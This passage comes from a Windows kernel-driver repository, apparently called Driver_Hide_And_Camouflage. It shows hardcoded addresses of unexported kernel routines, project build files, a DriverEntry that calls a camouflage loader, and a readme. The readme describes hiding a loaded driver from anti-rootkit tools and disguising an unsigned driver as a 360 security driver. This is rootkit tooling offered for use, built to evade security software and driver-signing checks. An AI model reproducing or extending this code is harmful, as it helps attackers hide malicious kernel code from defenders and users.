	SizeOfImageOffset = 0x40;//GetMembersOffset(L"_LDR_DATA_TABLE_ENTRY", L"SizeOfImage");
	FlagsOffset = 0x68;//GetMembersOffset(L"_LDR_DATA_TABLE_ENTRY", L"Flags");

	Pqword_14040EF40 = 0xfffff8042ba0ef20 + 0x20;//GetSymAddress(L"SeCiCallbacks") + 0x20;

	PULONG64 b = &RtlImageNtHeader;
	*b = GetSymAddress(L"RtlImageNtHeader");

	b = &MiGenerateSystemImageNames;
	*b = 0xfffff8042bc69728;//

	b = &MiObtainSectionForDriver;
	*b = 0xfffff8042bbdaaac;//

	b = &MiGetSystemAddressForImage;
	*b = 0xfffff8042bc37064;//

	b = &MiMapSystemImage;
	*b = 0xfffff8042bc69104;//

	b = &RtlImageDirectoryEntryToData;
	*b = GetSymAddress(L"RtlImageDirectoryEntryToData");

	b = &MiSnapThunk;
	*b = 0xfffff8042bbda7e4;//

	b = &MmAcquireLoadLock;
	*b = 0xfffff8042bc6c260;//

	b = &MmReleaseLoadLock;
	*b = 0xfffff8042bc6c220;//
	
	b = &MiFillPteHierarchy;
	*b = 0xfffff8042b6f53f0;//

	b = &IopReadyDeviceObjects;
	*b = 0xfffff8042bc63b3c;//

	//------驱动伪装特有-------------

	PCmRegistryMachineHardwareDescriptionSystemName = 0xfffff8042bf6e888;//GetSymAddress(L"CmRegistryMachineHardwareDescriptionSystemName");


	b = &MiConstructLoaderEntry;
	*b = 0xfffff8042bc69db0;// GetSymAddress(L"MiConstructLoaderEntry");


	b = &ObInsertObjectEx;
	*b = 0xfffff8042bc84f50;// GetSymAddress(L"ObInsertObjectEx");

	b = &ObCreateObjectEx;
	*b = 0xfffff8042bc96270;// GetSymAddress(L"ObCreateObjectEx");

	PIopInvalidDeviceRequest = 0xfffff8042b67bd70;//GetSymAddress(L"IopInvalidDeviceRequest");

	PIopDriverLoadResource = 0xfffff8042ba36ba0;// GetSymAddress(L"IopDriverLoadResource");

	PIoDriverObjectType = GetSymAddress(L"IoDriverObjectType");

	return TRUE;	
}


```

`Project/Kernel_PDB.h`:

```h
#pragma once
#include<ntifs.h>

typedef struct _MyIID {
	ULONG32 a;//Dllbase + a 为 导入函数名称偏移表第n项 地址
	ULONG32 b;
	ULONG32 c;
	ULONG32 d;//Dllbase + d 为 导入模块名称 地址
	ULONG32 e;//Dllbase + e 为 将第n项导入函数填入的第n项 地址    
}MyIID, * PMyIID;


typedef struct _PTE_HIERARCHY {
	PULONG64* pte;
	PULONG64* PDE;
	PULONG64* PDPTE;
	PULONG64* PML4E;
}PTE_HIERARCHY,*PPTE_HIERARCHY;


//4kb  PDPE and PDE and PTE
typedef struct _PML4_ENTRY_4KB {
	union {
		UINT64 AsUInt64;
		struct {
			UINT64 Valid : 1;               // [0]
			UINT64 Write : 1;               // [1]
			UINT64 User : 1;                // [2]
			UINT64 WriteThrough : 1;        // [3]
			UINT64 CacheDisable : 1;        // [4]
			UINT64 Accessed : 1;            // [5]
			UINT64 Reserved1 : 3;           // [6:8]
			UINT64 Avl : 3;                 // [9:11]
			UINT64 PageFrameNumber : 40;    // [12:51]
			UINT64 Reserved2 : 11;          // [52:62]
			UINT64 NoExecute : 1;           // [63]
		} Fields;
	};
}
PML4_ENTRY_4KB, * PPML4_ENTRY_4KB, PDP_ENTRY_4KB, * PPDP_ENTRY_4KB, PD_ENTRY_4KB, * PPD_ENTRY_4KB, PT_ENTRY_4KB, * PPT_ENTRY_4KB;

BOOLEAN InitAllOffSet();
```

`Project/Kernel_PDB_Frame_R0.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{620d6b54-5723-457e-92cb-980340074bc6}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>Kernel_PDB_Frame_R0</RootNamespace>
    <ProjectName>DrvLoad</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
    <Driver_SpectreMitigation>false</Driver_SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <SuppressStartupBanner>false</SuppressStartupBanner>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>TurnOffAllWarnings</WarningLevel>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="DriverObject.c" />
    <ClCompile Include="DrvLoad.c" />
    <ClCompile Include="Kernel_PDB.c" />
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="DriverObject.h" />
    <ClInclude Include="Head.h" />
    <ClInclude Include="DrvLoad.h" />
    <ClInclude Include="Kernel_PDB.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Project/Kernel_PDB_Frame_R0.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Kernel_PDB.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DriverObject.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DrvLoad.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Head.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Kernel_PDB.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DriverObject.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DrvLoad.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Project/main.c`:

```c
#include"head.h"
#define HideDrvPath L"\\??\\C:\\Users\\nihao\\Desktop\\test\\Test_Drv.sys"

#define ADrvPath L"\\??\\C:\\Users\\nihao\\Desktop\\test\\Test_Drv.sys"
#define ODrvPath L"\\??\\C:\\Users\\nihao\\Desktop\\test\\360AntiHacker64.sys"
#define ServiceName  L"AntiHacker"

PDRIVER_OBJECT Driver = NULL;

NTSTATUS Exit(DRIVER_OBJECT* DriverObject) {
	DbgPrint("DriverUnload\n");
	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(DRIVER_OBJECT* DriverObject, UNICODE_STRING* STR) {
	//DbgBreakPoint();
	NTSTATUS status = STATUS_SUCCESS;
	Driver = DriverObject;
	if (InitAllOffSet()) {
		//LoadDrv(HideDrvPath);// 驱动隐藏加载测试
		CamouflageDrvLoad(ADrvPath, ODrvPath, ServiceName);//驱动伪装加载测试
	}

	return status;

}
```

`readme.md`:

```md
# Driver_Hide_And_Camouflage


Due to the use of a large number of Windows unexported functions, Need to modify InitAllOffSet() at Kernel_PDB.c



## Hide:

Driver loaded( Test_Drv.sys ),But ARK Not found:

![](https://github.com/IcEy-999/Drv_Hide_And_Camouflage/blob/main/picture/ARKHide.png)



## Camouflage:

Unsigned driver disguised as 360 driver

![](https://github.com/IcEy-999/Drv_Hide_And_Camouflage/blob/main/picture/Ark.png)

Look at the device name, this is my driver and device

![](https://github.com/IcEy-999/Drv_Hide_And_Camouflage/blob/main/picture/HRJ.png)




```